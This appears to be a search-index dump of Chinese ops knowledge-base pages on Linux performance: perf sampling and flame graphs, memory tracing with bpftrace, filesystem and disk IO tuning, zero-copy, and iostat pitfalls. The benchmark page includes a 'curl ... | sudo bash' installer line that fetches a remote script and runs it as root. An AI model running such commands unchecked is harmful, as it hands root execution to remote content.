发生IO等待时，处理其它事务，然后固定的时间去检查IO事件是否完成 select: select 是非阻塞轮询的升级版，select可以观察多个流的IO事件，没有IO事件时阻塞掉当前线程，有IO事件时唤醒线程。但是这样效率依然比较低， 因为只返回了有IO事件，并没有返回具体是哪个流发生了IO事件，客户端需要遍历所有的流。时间复杂度是O(n) epoll: epoll 是一种IO事件通知机制，比如epoll注册了非空和非满这两个事件，缓冲区非空代表有数据流入，非满代表流可以被写入，时间复杂度降低到了O(1) Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-11-25 05:11:56 "},"系统性能/Perf零侵入应用性能瓶颈分析.html":{"url":"系统性能/Perf零侵入应用性能瓶颈分析.html","title":"Perf零侵入应用性能瓶颈分析","keywords":"","body":"常见的性能分析工具 ftrace perf systemTap ... 利用Perf性能分析 perf简介 perf是Linux内核内置的性能分析器，能直接定位高级语言中（比如C/Go）的某个函数甚至某行的性能开销，原理是每隔一段时间就在CPU上产生一个中断，在中断上针对进程、函数附加统计值，这样就知道Cpu有多少时间消耗在哪个进程上,再通过反汇编将指令转换为可视化代码。 简单点： 几乎所有的东西都可以使用跟踪器来跟踪和分析。比如TCP/IP过程、应用程序内部、系统内部等等。利用分析器你可以获得洞悉一切的能力，比如strace和tcpdump也可以理解为跟踪器，perf这类系统跟踪器可以获得更多的系统调用数据 什么时候需要Perf 例：比如你写了一个应用，但是运行起来发现CPU使用率高，运行慢。一个新手可能会猜测哪一部分的代码有问题，或者花费大量的时间去静态分析代码。经验告诉我们这种做法非常低效！例：对于运维人员，研发最近修改了部分代码上线后，CPU使用率突增，查看所有应用源码这对运维人员来说显然工作量巨大且不现实 通过perf，你可以不需要修改代码，仅仅进行几次采样就可以快速找到任意内核，任意应用程序的性能热点，并且可以利用flame graph 生成火焰图 perf采样理念诞生于2009年，采样这个方式在现分布式系统中也特别常见，比如我们会对整个分布式系统的所有调用链的响应情况做采样，以此为全链路监控提供数据支撑，以此来判断全局RT Perf开启零侵入式应用分析 Perf 分析一个正在运行的程序 1.获得在运行的进程PID 2.开始采样perf record -g -p 根据采样数据分析性能热点perf report 图中可以看出88%的性能开销来自main.Fun3函数，10%的性能损耗来自Main.fun1函数输出结果： Overhead：指出了该Symbol采样在总采样中所占的百分比。在当前场景下，表示了该Symbol消耗的CPU时间占总CPU时间的百分比 Command：进程名 Shared Object：模块名， 比如具体哪个共享库，哪个可执行程序。 Symbol：二进制模块中的符号名，如果是高级语言，比如C语言编写的程序，等价于函数名。 分析函数中代码性能 我们光标移动到main.func3处，按回车会出现如下内容，然后再按回车 出现了具体的函数内容，内容是通过反汇编方式展示。这里可以看着我们99%的性能损耗来自for循环 附加：生成火焰图 命令git仓库：https://github.com/brendangregg/FlameGraph.git 1.用perf script工具对perf.data进行解析 `perf script -i perf.data &> perf.unfold` 2.将perf.unfold中的符号进行折叠 `./stackcollapse-perf.pl perf.unfold &> perf.folded` 3.最后生成svg图： `./flamegraph.pl perf.folded > perf.svg` 测试程序 分析测试程序 test测试程序下载地址: https://itgod.org/book/test 采样后会在当前目录下生成一个perf.data文件， Ctrl+C终止采样 启动./test应用，并开始性能采样perf record -F 999 ./test 针对所有进程进行采样(-g可以生成火焰图)perf record -g -a 对正在运行的应用怎么办？可以指定的Pid进程采样 perf record -g -p 分析采样文件输出性能报告（能定位到具体的函数） 默认根据当前目录下的perf.data输出报告 perf report 输出结果： Overhead：指出了该Symbol采样在总采样中所占的百分比。在当前场景下，表示了该Symbol消耗的CPU时间占总CPU时间的百分比 Command：进程名 Shared Object：模块名， 比如具体哪个共享库，哪个可执行程序。 Symbol：二进制模块中的符号名，如果是高级语言，比如C语言编写的程序，等价于函数名。 附加: 输出性能报告（定位到具体行） perf annotate --stdio --symbol=main.chFunc 生成火焰图 命令git仓库：https://github.com/brendangregg/FlameGraph/1.用perf script工具对perf.data进行解析perf script -i perf.data &> perf.unfold2.将perf.unfold中的符号进行折叠./stackcollapse-perf.pl perf.unfold &> perf.folded3.最后生成svg图：./flamegraph.pl perf.folded > perf.svg Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2023-02-07 05:06:14 "},"系统性能/内存.html":{"url":"系统性能/内存.html","title":"内存","keywords":"","body":"术语 主存：CPU可以直接访问的内存，存放正在使用的程序和数据的存储器虚拟内存：虚拟内存是一个抽象的概念，并不是真正的内存，是操作系统在内存和硬盘之间模拟出的一种内存空间，内存不足时临时用作数据缓存（图1.1）页： 分页是磁盘和内存间传输数据块的最小单位缺页：当程序需要使用某个内存页面时，该页面不在物理内存中，需要从硬盘加载进内存，因此会导致系统的性能下降，由CPU的内存管理单元发出的中断(图1.1)。使用按需虚拟内存时，这是正常现象换页：在主存和存储设备之前交换页交换：Linux中的swap空间，是回收匿名页的唯一手段。将整个进程的内存页面都存储在硬盘上，它比换页的效率更低，因为它需要将进程的所有页都存储在硬盘上 常驻内存： 当前处于主存中的内存匿名内存： 无文件系统位置或者路径名的内存。他包括进程地址空间的工作数据，称为堆OOM: 内存耗尽，内核检测到可用内存低使用率：有多少内存被使用（一个系统可能报告只有10MB的可用内存，但实际上它存爱10GB的文件系统缓存，需要时能够立刻被回收利用，需要查询工具文档显示结果是否包含了文件系统缓存和非活动页）饱和度：页扫描、换页、交换和OOM牺牲进程性能，可作为内存压力的衡量 虚拟内存 (图1.1) 分析方法 工具法 使用可用工具，检查它们显示的关键指标页扫描： 寻找连续的页扫描（超过10秒），它是内存压力的预兆，在Linux中可以使用sar -B检查pgscan列压力滞留信息： 查看/proc/pressure/memory可以检查内存压力（饱和度）统计交换： 内存页的交换是系统内存不足的体现，可以使用vmstat检查si和so列OOM： 通过/var/log/message或者dmesg信息中中搜索 “Out of memory”perf/bcc/bpftace： 通过跟踪内存分配，确认内存消耗的原因。需要注意的事，这会产生大量的开销。一个低能耗但是比较粗糙的解决方案是通过CPU剖析搜索分配代码的路径 USE法 检查使用率检查饱和度检测错误 正确描述内存的使用情况 例： 该系统又256G内存，只有1%被进程使用，30%是文件系统缓存。用量最大的进程是数据库，消耗了2GB的主存（RSS） 内存交换分析 内存换入换出 sar -B 换页统计信息 Perf分析 缺页采样（RSS增长）以及其栈跟踪,记录PID 1932进程在60秒内发生的所有缺页和栈跟踪perf record -e page-faults -c 1 -p 1932 -g -- sleep 6-因为缺页是随着进程的RSS增长而发生的，因此分析它们可以解释为什么进程的主存在增长，可以了解的内存使用过程中的缺页故障perf script 查看栈情况缺页火焰图同CPU火焰图 跟踪kswapd唤醒事件per record -e vmscan:mm_vmscan_wakeup_kswapd -ag drsnoop分析 drsnoop是一个bcc工具，用于跟踪直接通过内存回收释放内存的方法，显示受影响的进程和延时，他可以用来量化内存受限系统对应用性能的影响drsnoop -T bpftrace分析 bpftrace 是一个基于bpf的跟踪器按用户栈和进程对libc malloc()请求量求和，得到高开销bpftrace -e 'uprobe:/usr/lib64/libc.so.6:malloc { @[ustack, comm] = sum(arg0); }' 指定进程 bpftrace -e 'uprobe:/usr/lib64/libc.so.6:malloc /pid == 181/ { @[ustack, comm] = sum(arg0); }'按字节显示，方式为2的幂次方直方图 bpftrace -e 'uprobe:/usr/lib64/libc.so.6:malloc /pid == 181/ { @[ustack, comm] = hist(arg0); }' Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2023-03-10 00:40:15 "},"系统性能/基准测试.html":{"url":"系统性能/基准测试.html","title":"基准测试","keywords":"","body":"磁盘IO yum install -y fio fio -direct=1 -iodepth=32 -rw=randwrite -ioengine=libaio -bs=4k -numjobs=4 -time_based=1 -runtime=1000 -group_reporting -filename=./a -name=test -size=1G 网络 curl -s https://packagecloud.io/install/repositories/ookla/speedtest-cli/script.rpm.sh | sudo bash sudo yum install speedtest speedtest Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-09-30 05:34:41 "},"系统性能/文件系统.html":{"url":"系统性能/文件系统.html","title":"文件系统","keywords":"","body":"负载特征 操作频率和类型 IO吞吐量 IO大小分布 读写比例 同步写比例 随机和连续访问比例 静态性能调优 文件系统记录的大小是多少 是否开启了访问时间戳，还启用了哪些文件系统选项（压缩、加密）等 文件系统的缓存是怎么配置，最大缓存大小是多少 是否用了RAID 用的是什么文件系统 尝试回答上面这些问题可以暴露一些容易被忽视的配置问题 性能检测 延时和操作频率一个1字节的写入操作可能会产生多次磁盘的读和写，比如： 文件系统定位这个地址对应的128KB记录块，发现它未在缓存中文件系统请求从磁盘加载那个记录块磁盘进行了多次较小的IO读操作，一共读取128KB文件系统把要写入的那个字节替换成新的数据文件系统请求把128K的脏记录写到磁盘磁盘写入128KB，可能还会分拆成多次写请求文件系统写入新的元数据，比如访问时间 操作并不平等比如每秒500次的IO操作负载性能如何，我们无法判断。影响性能的关键因素还包括：随机IO还是顺序IO、读取还是写入、同步写还是异步写、IO的大小等等 应用程序与文件系统延迟比如一个程序执行一个事务花了200ms，其中180ms是在等待IO，程序程序被文件系统阻塞的时间为100 *（180/200） = 90%，假设我们解决文件系统IO等待，性能可以提升90% 正确的描述一个文件系统负载 xx应用给文件系统产生了随机读负载，频率为180000/s次读，平均读大小是4KB，总操作频率是210000/s次，包括读取、统计、打开、关闭和每秒200次的同步写入，写评论相对于读较为稳定，高峰期读取能达到每秒40000次 观测工具 原生工具 mount 查看mount命令输出中，磁盘的挂载选项 比如relatime是一个提高性能的选项，只有在修改或则更新的时间距离上次时间超过一天时才触发更新，从而减少inode访问时间的更新，降低磁盘的IO开销 sar sar -v 1 dentunusd 目录项缓存未用计数 file-nr 使用中的文件句柄数量 inode-nr 使用中的inode数量 pty-nr 使用的伪终端个数 BCC工具 opensnoop opensoop -T -T时间戳 -x 只显示失败的打开事件 -p PID 仅仅跟踪这个进程 -n 筛选进程名cachestat cachestat -T 1 显示内存命中率 ext4dist extdist 10 1 10秒间隔和一次计数来展示一次10秒的跟踪，显示每种类型操作的延迟分布 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2023-03-09 01:25:35 "},"系统性能/深拷贝&浅拷贝&零拷贝.html":{"url":"系统性能/深拷贝&浅拷贝&零拷贝.html","title":"深拷贝&浅拷贝&零拷贝","keywords":"","body":"零拷贝 用户进程拥有用户空间的缓存区;CPU操作文件时无法直接从磁盘中读取，而是从内存读取。默认情况下读取一个文件并将文件内存发送的过程是 磁盘文件->内核态PageCache->用户缓冲区->socket缓冲区->网卡。如下图，进行了4次数据拷贝，以及4次上下文切换 之后出现了DMA技术，简单理解，DMA就是在主板上有一块独立的芯片。在进行内存和IO设备数据传输的时候，直接通过DMA搬运。不需要CPU去处理Copy 零拷贝技术是一个思想，指的是指计算机执行操作时，CPU 不需要先将数据从某处内存复制到另一个特定区域。零拷贝技术的具体实现方式有很多，例如： sendfile mmap Direct I/O splice不同的零拷贝技术适用于不同的应用场景 DMA技术：DMA负责内存与其他组件之间的数据拷贝，CPU 仅需负责管理，而无需负责全程的数据拷贝；使用 page cache 的 zero copy： sendfile：一次代替 read/write 系统调用，通过使用 DMA 技术以及传递文件描述符，实现了 zero copy； mmap：仅代替 read 系统调用，将内核空间地址映射为用户空间地址，write 操作直接作用于内核空间。通过 DMA 技术以及地址映射技术，用户空间与内核空间无须数据拷贝，实现了 zero copy； 不使用 page cache 的 Direct I/O：读写操作直接在磁盘上进行，不使用 page cache 机制，通常结合用户空间的用户缓存使用。通过 DMA 技术直接与磁盘/网卡进行数据交互，实现了 zero copy； 案例： 1、Kafka接收消息并持久化时，使用 mmap 机制，能够基于顺序磁盘 I/O 提供高效的持久化能力2、发送消息时，使用sendfile机制 使用 mmap 来对接收到的数据进行持久化，使用 sendfile 从持久化介质中读取数据然后对外发送是一对常用的组合。但是注意，你无法利用 sendfile 来持久化数据，利用 mmap 来实现 CPU 全程不参与数据搬运的数据拷贝。 总结： DMA 技术使得内存与其他组件，例如磁盘、网卡进行数据拷贝时，CPU 仅仅需要发出控制信号，而拷贝数据的过程则由 DMAC 负责完成。 Linux 的零拷贝技术有多种实现策略，但根据策略可以分为如下几种类型： 减少甚至避免用户空间和内核空间之间的数据拷贝：在一些场景下，用户进程在数据传输过程中并不需要对数据进行访问和处理，那么数据在 Linux 的 Page Cache 和用户进程的缓冲区之间的传输就完全可以避免，让数据拷贝完全在内核里进行，甚至可以通过更巧妙的方式避免在内核里的数据拷贝。这一类实现一般是是通过增加新的系统调用来完成的，比如 Linux 中的 mmap()，sendfile() 以及 splice() 等。 绕过内核的直接 I/O：允许在用户态进程绕过内核直接和硬件进行数据传输，内核在传输过程中只负责一些管理和辅助的工作。这种方式其实和第一种有点类似，也是试图避免用户空间和内核空间之间的数据传输，只是第一种方式是把数据传输过程放在内核态完成，而这种方式则是直接绕过内核和硬件通信，效果类似但原理完全不同。 内核缓冲区和用户缓冲区之间的传输优化：这种方式侧重于在用户进程的缓冲区和操作系统的页缓存之间的 CPU 拷贝的优化。这种方法延续了以往那种传统的通信方式，但更灵活。 补充： 用户态和内核态 Linux内核控制了硬件资源，例如CPU协调、内存分配。用户态就是提供应用程序运行的空间，为了时应用程序访问到CPU、内存、IO等，所以内核提供了一系列的系统调用接口 系统调用主要分为2类： 库函数（https://zhuanlan.zhihu.com/p/344311940） shell Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-09-30 05:34:41 "},"系统性能/磁盘IO静态调优篇.html":{"url":"系统性能/磁盘IO静态调优篇.html","title":"磁盘IO静态调优篇","keywords":"","body":"IO模型 阻塞IO 非阻塞IO IO多路复用 异步IO 常见多路复用IO实现： select: 基于数组实现，时间复杂度O(n)，发生事件时，需要把所有的文件描述符从用户空间复制到内核空间，遍历文件描述符数组 poll： 基于链表实现，总时间复杂度(O(n))，发生事件时，遍历链表。链表在大量删除插入场景时间复杂度为O(1)，查找时O(n),性能高于数组，poll记录大量fd时的性能高于select epoll： 基于红黑树实现，时间复杂度(O(1)，属于异步事件驱动方式 Nginx采用epoll IO多路复用处理多个连接：epoll处理大量连接请求和并发请求非常高效，能支持超10W连接的高并发访问；而异步IO模型在处理大量连接时，需要为每个连接创建独立的上下文，会导致上下文切换消耗服务器资源、降低性能。epoll支持水平触发和边缘触发，而异步IO只支持边缘触发 静态磁盘IO性能优化出发点 应用程序 文件系统 物理磁盘 应用程序 1、根据应用场景选择IO模型，比如采用epoll多路复用IO2、使用队列机制，如果是大量小IO，一次性处理多个小IO落盘，增加吞吐量3、使用零拷贝 文件系统 1、调整文件系统缓存参数2、关闭atime等，降低IOPS3、使用高效的文件系统，比如ext4、xfs,这种文件系统会先将数据写在日志中，然后才写入实际文件，可以提供写入性能和数据可靠性 ext4、xfs等都提供了区段、预读、预分配、延迟分配等机制 物理磁盘 1、使用Raid技术 2、使用更高转速的HDD或则使用SSD等HDD最外圈的吞吐量比较高，内圈比较低 使用SSD时最关注的问题是寿命，ssd具有读写次数限制，最好的颗粒是SLC（single-level cell 每个单元只存储一个比特的数据），其次是MLC(multi-level cell可以存储2/4/8多个比特)，MLC成本与优势，但是擦写次数少使用SSD时尽量预留一些空间，某个存储单元坏掉时会触发坏块管理以保证数据可靠性，自动使用备用存储单元顶替，如果坏掉了大量的存储单元会影响性能和可靠性,SSD还具备均衡存储单元的能力 最后： 最好的IO是没有IO Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2023-03-10 01:08:54 "},"系统性能/系统繁忙指标的意义.html":{"url":"系统性能/系统繁忙指标的意义.html","title":"系统繁忙指标的意义","keywords":"","body":"关于磁盘IO iostat作为systat这个系统自带的使用工具包中的命令，但iostat -x显示的内容中潜伏着一些警告 util值和scvtm值一般用于判断磁盘的利用率和饱和度的重要指标 基础知识 svctm表示向设备发起I/O请求的平均响应时间(被广泛认为是一个操作锁华为的平均时间) util表示向设别发送I/O请求的CPU时间百分比(被广泛认为超过80%就是严重的IO性能瓶颈) svctm和util的值在带有固态驱动器或者RAID上被放大了，这两个字段的值并不能反应出它们的性能限制 iostat手册中将svctm描述警告为平均服务时间（svctm字段）值没有意义，因为I/O统计现在是在块级别计算的，我们不知道磁盘驱动程序何时开始处理请求。 假设A做10件事情需要20分钟，那么平均做每件事情需要2分钟。假设B可以同时做10件事情，做每件事情也同样需要两分钟，这样看来B拥有更高的并行度。但是在单次请求结果方面，A和B处理一次事情的时间都是2分钟 所以在拥有固态或者RAID的服务器中，svctm和uil并不能反应出性能限制 实例: Device: rrqm/s wrqm/s r/s w/s rkB/s wkB/s avgrq-sz avgqu-sz await r_await w_await svctm %util sdd 0.00 0.00 13823.00 0.00 55292.00 0.00 8.00 -1.78 0.06 0.06 0.00 0.06 78.40 Device: rrqm/s wrqm/s r/s w/s rkB/s wkB/s avgrq-sz avgqu-sz await r_await w_await svctm %util sdd 0.00 0.00 72914.67 0.00 291658.67 0.00 8.00 15.27 0.21 0.21 0.00 0.01 100.00 那么%util发生了什么？第一个iostat结果告诉我们，驱动器的利用率为 78.4%，每秒读取13823 次。第二行告诉我们，驱动器在每秒 72914 次读取时被100%使用。如果要14000才能填到78.4%，难道我们不期望它总共只能做18000吗？7.3万怎么做到的？ 这里的问题是出在并行性。当iostat 说%util时，它的意思是“向设备发出 I/O 请求的 CPU 时间百分比”。驱动器至少做一件事的时间百分比。如果它同时做 16 件事，那不会改变。再一次，这个计算对于驱动器来说效果很好，它一次只做一件事。他们花在做一件事上的时间很好地表明了他们真正的忙碌程度。另一方面，SSD（以及 RAID 和 Alice）可以同时做多项事情。如果你可以同时做多件事，你至少做一件事的时间百分比不能很好地预测您的表现潜力 Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-06-28 03:23:46 "},"系统性能/进程与线程.html":{"url":"系统性能/进程与线程.html","title":"进程与线程","keywords":"","body":"Copyright © 运维知识库 all right reserved. 蜀ICP备16012425号文件修订时间： 2022-09-28 03:14:34 "}}